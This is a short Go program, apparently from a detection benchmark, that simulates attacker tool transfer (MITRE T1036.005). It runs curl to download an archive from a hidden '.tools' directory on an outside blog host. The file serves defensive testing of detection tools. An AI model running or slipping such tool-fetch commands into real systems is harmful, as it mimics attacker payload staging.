//go:build !windows

// Simulates tool transfer using curl to a URL with a hidden directory [T1036.005]
package main

import (
	"time"

	"github.com/tstromberg/ioc-bench/pkg/iexec"
)

func main() {
	iexec.WithTimeout(30*time.Second, "curl", "-LO", "http://ioc-bench.blogspot.com/home/.tools/archive.tgz")
}
